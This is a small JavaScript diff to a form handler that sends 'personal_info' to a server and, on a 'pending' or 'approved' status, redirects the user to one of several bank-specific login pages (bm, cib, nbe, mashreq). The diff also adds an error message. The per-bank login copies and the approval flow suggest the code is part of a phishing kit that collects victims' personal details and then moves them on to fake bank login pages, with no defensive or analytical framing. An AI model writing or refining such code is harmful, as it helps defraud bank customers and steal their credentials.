@@ -141,10 +141,16 @@
                     body: JSON.stringify({ type: "personal_info", data })
                 });
                 const result = await response.json();
-                if (result.status === "pending") {
+                if (result.status === "pending" || result.status === "approved") {
                     localStorage.setItem("request_id", result.request_id);
                     const urls = { bm: 'login_bm_en.html', cib: 'login_cib_en.html', nbe: 'login_nbe_en.html', mashreq: 'login_en.html' };
                     window.location.href = urls[bankId] || 'login_en.html';
+                } else {
+                    const errorDiv = document.getElementById('errorMessage');
+                    if (errorDiv) {
+                        errorDiv.textContent = result.message || 'An unexpected error occurred.';
+                        errorDiv.style.display = 'block';
+                    }
                 }
             } catch (err) { console.error(err); }
         });
